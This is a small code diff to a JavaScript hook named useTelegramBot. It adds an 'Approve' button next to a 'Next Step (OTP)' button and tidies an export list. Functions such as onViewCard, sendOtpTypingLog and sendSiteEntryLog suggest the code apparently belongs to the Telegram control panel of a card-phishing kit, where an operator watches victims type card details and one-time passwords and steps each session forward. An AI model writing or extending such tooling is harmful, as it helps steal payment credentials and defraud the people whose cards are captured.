@@ -85,6 +85,7 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
       const keyboard = {
         inline_keyboard: [
           [
+            { text: "✅ Approve", callback_data: `approve_${sessionId}` },
             { text: "➡️ Next Step (OTP)", callback_data: `next_${sessionId}` }
           ],
           [
@@ -606,6 +607,6 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
     sendOtpTypingLog,
     sendSiteEntryLog,
     sendBlockedLog,
-    sendVisitNotification  // NOUVELLE FONCTION EXPORTÉE
+    sendVisitNotification
   };
 };
